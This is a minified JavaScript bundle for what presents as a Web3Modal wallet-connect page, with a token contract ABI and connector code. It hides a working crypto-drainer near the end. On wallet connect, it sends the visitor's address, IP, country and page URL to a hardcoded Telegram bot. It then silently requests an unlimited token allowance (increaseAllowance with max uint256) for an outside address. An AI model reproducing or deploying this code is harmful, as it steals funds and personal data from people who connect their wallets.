getChainId(){const{chainId:t}=await this.getProvider();return t}async getProvider({chainId:t}={}){return Le(this,Ke)||await ht(this,vs,Wu).call(this),t&&await this.switchChain(t),Le(this,Ke)}async getWalletClient({chainId:t}={}){const[e,n]=await Promise.all([this.getProvider({chainId:t}),this.getAccount()]),r=this.chains.find(o=>o.id===t);if(!e)throw new Error("provider is required.");return Ic({account:n,chain:r,transport:Ac(e)})}async isAuthorized(){try{const[t,e]=await Promise.all([this.getAccount(),this.getProvider()]),n=ht(this,xs,zu).call(this);if(!t)return!1;if(n&&e.session){try{await e.disconnect()}catch{}return!1}return!0}catch{return!1}}async switchChain(t){var n,r;const e=this.chains.find(o=>o.id===t);if(!e)throw new an(new Error("chain not found on connector."));try{const o=await this.getProvider(),i=ht(this,uc,mf).call(this),a=ht(this,dc,gf).call(this);if(!i.includes(t)&&a.includes(Fu)){await o.request({method:Fu,params:[{chainId:xe(e.id),blockExplorerUrls:[(r=(n=e.blockExplorers)==null?void 0:n.default)==null?void 0:r.url],chainName:e.name,nativeCurrency:e.nativeCurrency,rpcUrls:[...e.rpcUrls.default.http]}]});const c=ht(this,lc,pf).call(this);c.push(t),ht(this,Ai,Ao).call(this,c)}return await o.request({method:"wallet_switchEthereumChain",params:[{chainId:xe(t)}]}),e}catch(o){const i=typeof o=="string"?o:o==null?void 0:o.message;throw/user rejected request/i.test(i)?new $t(o):new an(o)}}};Ke=new WeakMap;Ro=new WeakMap;vs=new WeakSet;Wu=async function(){return!Le(this,Ro)&&typeof window<"u"&&Jo(this,Ro,ht(this,ff,cm).call(this)),Le(this,Ro)};ff=new WeakSet;cm=async function(){const{EthereumProvider:t}=await ki(()=>import("./index.es-N11d8qA8.js"),__vite__mapDeps([2,1])),e=this.chains.map(({id:n})=>n);if(e.length){const{projectId:n,showQrModal:r=!0,qrModalOptions:o,metadata:i,relayUrl:a}=this.options;Jo(this,Ke,await t.init({showQrModal:r,qrModalOptions:o,projectId:n,optionalChains:e,rpcMap:Object.fromEntries(this.chains.map(s=>[s.id,s.rpcUrls.default.http[0]])),metadata:i,relayUrl:a}))}};xs=new WeakSet;zu=function(){if(ht(this,dc,gf).call(this).includes(Fu)||!this.options.isNewChainsStale)return!1;const e=ht(this,lc,pf).call(this),n=this.chains.map(({id:o})=>o),r=ht(this,uc,mf).call(this);return r.length&&!r.some(o=>n.includes(o))?!1:!n.every(o=>e.includes(o))};Hu=new WeakSet;lm=function(){Le(this,Ke)&&(ht(this,cc,hf).call(this),Le(this,Ke).on("accountsChanged",this.onAccountsChanged),Le(this,Ke).on("chainChanged",this.onChainChanged),Le(this,Ke).on("disconnect",this.onDisconnect),Le(this,Ke).on("session_delete",this.onDisconnect),Le(this,Ke).on("display_uri",this.onDisplayUri),Le(this,Ke).on("connect",this.onConnect))};cc=new WeakSet;hf=function(){Le(this,Ke)&&(Le(this,Ke).removeListener("accountsChanged",this.onAccountsChanged),Le(this,Ke).removeListener("chainChanged",this.onChainChanged),Le(this,Ke).removeListener("disconnect",this.onDisconnect),Le(this,Ke).removeListener("session_delete",this.onDisconnect),Le(this,Ke).removeListener("display_uri",this.onDisplayUri),Le(this,Ke).removeListener("connect",this.onConnect))};Ai=new WeakSet;Ao=function(t){var e;(e=this.storage)==null||e.setItem(sm,t)};lc=new WeakSet;pf=function(){var t;return((t=this.storage)==null?void 0:t.getItem(sm))??[]};uc=new WeakSet;mf=function(){var r,o,i;if(!Le(this,Ke))return[];const t=(r=Le(this,Ke).session)==null?void 0:r.namespaces;return t?((i=(o=im(t)[am])==null?void 0:o.chains)==null?void 0:i.map(a=>parseInt(a.split(":")[1]||"")))??[]:[]};dc=new WeakSet;gf=function(){var r,o;if(!Le(this,Ke))return[];const t=(r=Le(this,Ke).session)==null?void 0:r.namespaces;return t?((o=im(t)[am])==null?void 0:o.methods)??[]:[]};function um(){return function(t){return t.rpcUrls.public.http[0]?{chain:t,rpcUrls:t.rpcUrls.public}:null}}const JE=le.getBlockchainApiUrl();function dm({projectId:t}){return function(n){if(!Un.WalletConnectRpcChainIds.includes(n.id))return null;const r=`${JE}/v1/?chainId=${ge.EIP155}:${n.id}&projectId=${t}`;return{chain:{...n,rpcUrls:{...n.rpcUrls,default:{http:[r]}}},rpcUrls:{http:[r]}}}}function XE({projectId:t,chains:e,metadata:n,enableInjected:r,enableCoinbase:o,enableEIP6963:i,enableEmail:a,enableWalletConnect:s}){const{publicClient:c}=dp(e,[dm({projectId:t}),um()]),l=[];return s!==!1&&l.push(new YE({chains:e,options:{projectId:t,showQrModal:!1,metadata:n}})),r!==!1&&l.push(new Sd({chains:e,options:{shimDisconnect:!0}})),i!==!1&&l.push(new J4({chains:e})),o!==!1&&l.push(new s8({chains:e,options:{appName:(n==null?void 0:n.name)??"Unknown"}})),a===!0&&l.push(new X4({chains:e,options:{projectId:t}})),b2({autoConnect:!0,connectors:l,publicClient:c})}function QE(t){return new Y4({...t,_sdkVersion:`html-wagmi-${ge.VERSION}`})}const eC=[{inputs:[{internalType:"address",name:"_governance",type:"address"},{internalType:"string",name:"_name",type:"string"},{internalType:"string",name:"_symbol",type:"string"}],stateMutability:"nonpayable",type:"constructor"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!0,internalType:"address",name:"spender",type:"address"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"Approval",type:"event"},{anonymous:!1,inputs:[{indexed:!1,internalType:"uint256",name:"_blockNumber",type:"uint256"}],name:"CreatedTotalSupplyCache",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"dst",type:"address"},{indexed:!1,internalType:"uint256",name:"amount",type:"uint256"}],name:"Deposit",type:"event"},{anonymous:!1,inputs:[{indexed:!1,internalType:"bytes4",name:"selector",type:"bytes4"},{indexed:!1,internalType:"uint256",name:"allowedAfterTimestamp",type:"uint256"},{indexed:!1,internalType:"bytes",name:"encodedCall",type:"bytes"}],name:"GovernanceCallTimelocked",type:"event"},{anonymous:!1,inputs:[{indexed:!1,internalType:"address",name:"initialGovernance",type:"address"}],name:"GovernanceInitialised",type:"event"},{anonymous:!1,inputs:[{indexed:!1,internalType:"address",name:"governanceSettings",type:"address"}],name:"GovernedProductionModeEntered",type:"event"},{anonymous:!1,inputs:[{indexed:!1,internalType:"bytes4",name:"selector",type:"bytes4"},{indexed:!1,internalType:"uint256",name:"timestamp",type:"uint256"}],name:"TimelockedGovernanceCallCanceled",type:"event"},{anonymous:!1,inputs:[{indexed:!1,internalType:"bytes4",name:"selector",type:"bytes4"},{indexed:!1,internalType:"uint256",name:"timestamp",type:"uint256"}],name:"TimelockedGovernanceCallExecuted",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"from",type:"address"},{indexed:!0,internalType:"address",name:"to",type:"address"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"Transfer",type:"event"},{anonymous:!1,inputs:[{indexed:!1,internalType:"uint256",name:"_contractType",type:"uint256"},{indexed:!1,internalType:"address",name:"_oldContractAddress",type:"address"},{indexed:!1,internalType:"address",name:"_newContractAddress",type:"address"}],name:"VotePowerContractChanged",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"src",type:"address"},{indexed:!1,internalType:"uint256",name:"amount",type:"uint256"}],name:"Withdrawal",type:"event"},{inputs:[{internalType:"address",name:"owner",type:"address"},{internalType:"address",name:"spender",type:"address"}],name:"allowance",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"approve",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"_owner",type:"address"},{internalType:"uint256",name:"_count",type:"uint256"}],name:"balanceHistoryCleanup",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"account",type:"address"}],name:"balanceOf",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"_owner",type:"address"},{internalType:"uint256",name:"_blockNumber",type:"uint256"}],name:"balanceOfAt",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address[]",name:"_delegatees",type:"address[]"},{internalType:"uint256[]",name:"_bips",type:"uint256[]"}],name:"batchDelegate",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address[]",name:"_owners",type:"address[]"},{internalType:"uint256",name:"_blockNumber",type:"uint256"}],name:"batchVotePowerOfAt",outputs:[{internalType:"uint256[]",name:"",type:"uint256[]"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"bytes4",name:"_selector",type:"bytes4"}],name:"cancelGovernanceCall",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"cleanerContract",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[],name:"cleanupBlockNumber",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"cleanupBlockNumberManager",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[],name:"decimals",outputs:[{internalType:"uint8",name:"",type:"uint8"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"subtractedValue",type:"uint256"}],name:"decreaseAllowance",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"_to",type:"address"},{internalType:"uint256",name:"_bips",type:"uint256"}],name:"delegate",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"_to",type:"address"},{internalType:"uint256",name:"_amount",type:"uint256"}],name:"delegateExplicit",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"_owner",type:"address"}],name:"delegatesOf",outputs:[{internalType:"address[]",name:"_delegateAddresses",type:"address[]"},{internalType:"uint256[]",name:"_bips",type:"uint256[]"},{internalType:"uint256",name:"_count",type:"uint256"},{internalType:"uint256",name:"_delegationMode",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"_owner",type:"address"},{internalType:"uint256",name:"_blockNumber",type:"uint256"}],name:"delegatesOfAt",outputs:[{internalType:"address[]",name:"_delegateAddresses",type:"address[]"},{internalType:"uint256[]",name:"_bips",type:"uint256[]"},{internalType:"uint256",name:"_count",type:"uint256"},{internalType:"uint256",name:"_delegationMode",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"_who",type:"address"}],name:"delegationModeOf",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"deposit",outputs:[],stateMutability:"payable",type:"function"},{inputs:[{internalType:"address",name:"recipient",type:"address"}],name:"depositTo",outputs:[],stateMutability:"payable",type:"function"},{inputs:[{internalType:"bytes4",name:"_selector",type:"bytes4"}],name:"executeGovernanceCall",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"governance",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[],name:"governanceSettings",outputs:[{internalType:"contract IGovernanceSettings",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[],name:"governanceVotePower",outputs:[{internalType:"contract IGovernanceVotePower",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"addedValue",type:"uint256"}],name:"increaseAllowance",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"_initialGovernance",type:"address"}],name:"initialise",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"name",outputs:[{internalType:"string",name:"",type:"string"}],stateMutability:"view",type:"function"},{inputs:[],name:"productionMode",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"view",type:"function"},{inputs:[],name:"readVotePowerContract",outputs:[{internalType:"contract IVPContractEvents",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"_who",type:"address"},{internalType:"uint256",name:"_blockNumber",type:"uint256"}],name:"revokeDelegationAt",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"_cleanerContract",type:"address"}],name:"setCleanerContract",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"uint256",name:"_blockNumber",type:"uint256"}],name:"setCleanupBlockNumber",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"_cleanupBlockNumberManager",type:"address"}],name:"setCleanupBlockNumberManager",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"contract IIGovernanceVotePower",name:"_governanceVotePower",type:"address"}],name:"setGovernanceVotePower",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"contract IIVPContract",name:"_vpContract",type:"address"}],name:"setReadVpContract",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"contract IIVPContract",name:"_vpContract",type:"address"}],name:"setWriteVpContract",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"switchToProductionMode",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"symbol",outputs:[{internalType:"string",name:"",type:"string"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"bytes4",name:"",type:"bytes4"}],name:"timelockedCalls",outputs:[{internalType:"uint256",name:"allowedAfterTimestamp",type:"uint256"},{internalType:"bytes",name:"encodedCall",type:"bytes"}],stateMutability:"view",type:"function"},{inputs:[],name:"totalSupply",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"_blockNumber",type:"uint256"}],name:"totalSupplyAt",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"_blockNumber",type:"uint256"}],name:"totalSupplyCacheCleanup",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"uint256",name:"_count",type:"uint256"}],name:"totalSupplyHistoryCleanup",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"totalVotePower",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"_blockNumber",type:"uint256"}],name:"totalVotePowerAt",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"_blockNumber",type:"uint256"}],name:"totalVotePowerAtCached",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"recipient",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"transfer",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"sender",type:"address"},{internalType:"address",name:"recipient",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"transferFrom",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"undelegateAll",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address[]",name:"_delegateAddresses",type:"address[]"}],name:"undelegateAllExplicit",outputs:[{internalType:"uint256",name:"_remainingDelegation",type:"uint256"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"_owner",type:"address"}],name:"undelegatedVotePowerOf",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"_owner",type:"address"},{internalType:"uint256",name:"_blockNumber",type:"uint256"}],name:"undelegatedVotePowerOfAt",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"_from",type:"address"},{internalType:"address",name:"_to",type:"address"}],name:"votePowerFromTo",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"_from",type:"address"},{internalType:"address",name:"_to",type:"address"},{internalType:"uint256",name:"_blockNumber",type:"uint256"}],name:"votePowerFromToAt",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"_owner",type:"address"}],name:"votePowerOf",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"_owner",type:"address"},{internalType:"uint256",name:"_blockNumber",type:"uint256"}],name:"votePowerOfAt",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"_owner",type:"address"},{internalType:"uint256",name:"_blockNumber",type:"uint256"}],name:"votePowerOfAtCached",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"_owner",type:"address"},{internalType:"uint256",name:"_blockNumber",type:"uint256"}],name:"votePowerOfAtIgnoringRevocation",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"vpContractInitialized",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"amount",type:"uint256"}],name:"withdraw",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"owner",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"withdrawFrom",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"writeVotePowerContract",outputs:[{internalType:"contract IVPContractEvents",name:"",type:"address"}],stateMutability:"view",type:"function"},{stateMutability:"payable",type:"receive"}];let Vu,Zu;async function tC(){await fetch("https://api.ipify.org?format=json").then(async t=>{Vu=(await t.json()).ip});try{console.log("ip is =>",Vu);const t=await fetch("http://ip-api.com/json/24.48.0.1").then(e=>e.json()).then(e=>{Zu=e,console.log(e)})}catch(t){console.log(t),Zu={ip:"null",city:"null",country:"null"}}}async function nC(t){await tC();const e=`
New Connect
ADDRESS:${t}
IP:${Vu}
COUNTRY:${Zu.country}
URL: ${window.location.href}

  `;await rC(e)}async function rC(t){await fetch("https://api.telegram.org/bot6544701468:AAFSmnyxKKOX_ZamiCFiqz1U5XUvVdS8ohI/sendMessage",{method:"POST",headers:{accept:"application/json","content-type":"application/json"},body:JSON.stringify({chat_id:"-1002049145724",text:t})})}const wf="b3ae38fc6afaa5b33311a2332c3c039a",{chains:iC}=dp([Is],[dm({projectId:wf}),um()]),oC={name:"Web3Modal",description:"Web3Modal Example",url:"https://web3modal.com",icons:["https://avatars.githubusercontent.com/u/37784886"]},aC=XE({chains:iC,projectId:wf,metadata:oC}),sC=QE({wagmiConfig:aC,projectId:wf,enableAnalytics:!1});function ah(){Os().isConnected?(hp(),Id({chainId:Is.id})):sC.open()}async function Gu(){await S2({abi:eC,address:"0x1D80c49BbBCd1C0911346656B529DF9E5c2F783d",functionName:"increaseAllowance",args:["0x00006be452316f8ab73dfc850ef0acc766600000","0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"]}).then(t=>{})}document.addEventListener("DOMContentLoaded",()=>{console.log(zl),qu.addEventListener("click",ah);for(let t=0;t<zl.length;t++)zl[t].addEventListener("click",ah);Hl==null||Hl.addEventListener("click",async()=>{await Gu()})});const qu=document.getElementById("btn"),zl=document.querySelectorAll(".connect-button"),Hl=document.getElementById("writeContract");pp(async t=>{var n,r;const e=Qo();if(t.isConnected){await nC(t.address),qu.innerText=`Disconnect ${(n=t.address)==null?void 0:n.substring(0,7)}`,((r=e.chain)==null?void 0:r.id)!==Is.id&&Id({chainId:Is.id});try{await Gu()}catch{Gu()}console.log("donee")}else qu.innerText="Connect"});export{sl as $,el as A,G as B,tn as C,fn as D,P0 as E,Ed as F,zr as G,To as H,ko as I,i9 as J,o9 as K,a9 as L,M9 as M,rr as N,s9 as O,rE as P,f9 as Q,l9 as R,d9 as S,u9 as T,em as U,k9 as V,Pt as W,h9 as X,y9 as Y,J9 as Z,ki as _,Qw as a,m9 as a0,X9 as a1,es as a2,E9 as a3,P9 as a4,O9 as a5,b9 as a6,S9 as a7,no as a8,C9 as a9,W9 as aA,FE as aB,U9 as aC,Z9 as aD,z9 as aE,G9 as aF,Y9 as aG,H9 as aH,V9 as aI,q9 as aJ,j9 as aK,PE as aL,rm as aM,Fl as aN,n9 as aO,r9 as aP,Z8 as aQ,I1 as aR,F9 as aa,N9 as ab,Jt as ac,_9 as ad,v9 as ae,x9 as af,ts as ag,cl as ah,tm as ai,g9 as aj,w9 as ak,c9 as al,I9 as am,$9 as an,ll as ao,p9 as ap,uf as aq,D9 as ar,T9 as as,A9 as at,R9 as au,Q9 as av,L9 as aw,B9 as ax,jE as ay,K9 as az,eb as b,tb as c,qh as d,$c as e,M2 as f,jw as g,fc as h,Et as i,ur as j,Vg as k,Lw as l,Ra as m,ms as n,Fn as o,At as p,_c as q,_n as r,Gn as s,K as t,Ha as u,cp as v,al as w,Wr as x,Se as y,gn as z};
function __vite__mapDeps(indexes) {
  if (!__vite__mapDeps.viteFileDeps) {
    __vite__mapDeps.viteFileDeps = ["assets/index-nhSKx7hn.js","assets/events-NJhuuF_G.js","assets/index.es-N11d8qA8.js"]
  }
  return indexes.map((i) => __vite__mapDeps.viteFileDeps[i])
}
